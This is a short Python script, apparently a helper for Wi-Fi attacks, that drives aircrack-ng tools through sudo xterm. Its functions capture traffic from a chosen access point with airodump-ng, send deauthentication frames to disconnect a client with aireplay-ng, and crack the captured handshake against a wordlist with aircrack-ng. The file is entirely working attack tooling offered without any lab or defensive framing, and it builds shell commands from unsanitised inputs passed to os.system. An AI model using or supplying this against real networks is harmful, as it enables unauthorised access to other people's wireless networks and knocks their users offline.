from multiprocessing import Process
from string import Template
from os import system
from subprocess import getoutput
from typing import List

GLOBAL_CMD='sudo xterm -e bash -c "{}"'
GLOBAL_CMD2=Template('sudo xterm -title "$title" -e $program -a $args &')

processes:List[Process]=[]
def capture_data(iw, path, channel, bssid):
    cmd=GLOBAL_CMD2.safe_substitute(title='Capturando datos...', program='airodump-ng', args=f'-w {path} --channel {channel} --bssid {bssid} {iw}')
    func=lambda _cmd : system(_cmd)

    p1=Process(target=func,args=(cmd, ))
    p1.start()
    processes.append(p1)

def deauth(iw, bssid_ap, bssid_client):
    cmd=GLOBAL_CMD.format(f'aireplay-ng --deauth 2 -a {bssid_ap} -c {bssid_client} {iw}')
    func=lambda _cmd : print(f'Output1: {getoutput((_cmd))}')

    p2=Process(target=func, args=(cmd, ))
    p2.start()
    processes.append(p2)

def crack(path_cap, path_wordlist):
    cmd=GLOBAL_CMD.format(f"aircrack-ng {path_cap}-01.cap -w {path_wordlist}; read")
    func=lambda _cmd : print(f'Output3: {getoutput((_cmd))} {cmd}')

    p4=Process(target=func, args=(cmd, ))
    p4.start()
    processes.append(p4)

def _joiner_processes():
    for process in processes:
        process.join()
